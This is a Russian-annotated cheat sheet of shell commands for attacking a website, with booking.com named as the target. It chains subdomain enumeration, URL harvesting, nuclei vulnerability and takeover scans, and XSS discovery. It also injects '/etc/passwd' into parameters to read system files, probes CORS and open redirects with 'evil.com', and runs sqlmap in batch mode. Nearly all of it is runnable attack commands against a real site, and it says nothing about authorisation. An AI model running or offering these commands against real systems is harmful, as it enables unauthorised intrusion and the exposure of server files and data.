* echo booking.com > target.txt
# найдет субдомены 
* subfinder -dL target.txt -all --recursive -o subs.txt
# оставляем только живые 
* cat subs.txt | httpx -o aliveSubs.txt
 _________________________________________ вытащить все юрл с субдоменов _________________________________________
* cat subs.txt | waybackurls | tee urls.txt
 _________________________________________ перверяет субдомен тейковер среди живых доменов _________________________________________
* nuclei -t /nuclei-templates/takovers/ -l aliveSubs.txt
* nuclei -l urls.txt -t /nuclei-templates/fuzzing-templates/
_________________________________________ проверяет на cve, exposure, vuln _________________________________________
* nuclei -list aliveSubs.txt -t /nuclei-templates/vulnerabilities -t /nuclei-templates/cves -t /nuclei-templates/exposures
  _________________________________________ из юрл извлекаем те юрл у которых есть параметры и js файлы _________________________________________
* cat urls.txt | grep "=" | tee param.txt
* cat urls.txt | grep -iE '.js'| grep -ivE '.json' | sort -u | tee js.txt
  _________________________________________ проверяет баги в js файлах _________________________________________
* nuclei -t /nuclei-templates/http/exposures/ -l js.txt -o jsBugs.txt
  _________________________________________ проверяет xss _________________________________________
* cat urls.txt | uro | gf xss > xss.txt
* cat param.txt | kxss
* paramspider -d booking.com
 _________________________________________ проверяет lfi _________________________________________
* cat aliveSubs.txt | gau | uro | gf lfi | tee lfi.txt
* nuclei -l target.txt -tags lfi
* cat aliveSubs.txt | gau | uro | gf lfi | qsreplace  "/etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is Vulnerable"; done;
* site=$(cat target.txt); gau $site | while read url; do target=$(curl -sIH Origin: https://evil.com -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on $url; fi; done
  ________________________________________ проверяет sqli ________________________________________
* python3 sqlifinder.py -d booking.com
* sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
  ______________________________________ проверяет открытое перенаправление _________________________________________
* cat urls.txt | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep evil.com && echo $host 3[0;31mVulnerable\n ;done
 _________________________________________ нуклей фазер проверет все уязвимости _________________________________________
* nf -d booking.com

